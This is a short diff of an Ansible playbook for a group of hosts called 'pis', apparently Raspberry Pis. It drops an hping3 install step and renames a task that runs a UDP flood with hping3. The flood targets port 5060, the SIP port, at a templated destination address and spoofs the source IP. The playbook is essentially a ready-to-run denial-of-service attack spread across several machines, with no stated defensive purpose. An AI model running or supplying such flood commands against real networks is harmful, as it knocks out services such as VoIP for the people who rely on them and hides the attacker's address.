@@ -1,9 +1,5 @@
 ---
 - hosts: pis
   tasks:
-    - name: Install hping3
-      apt:
-        name: hping3
-        state: present
-    - name: Run UDP-DOS
+    - name: Run UDP-Flood
       shell: hping3 --udp -p 5060 --destport 5060 -a 192.168.1.199 --flood {{DST_IP}}
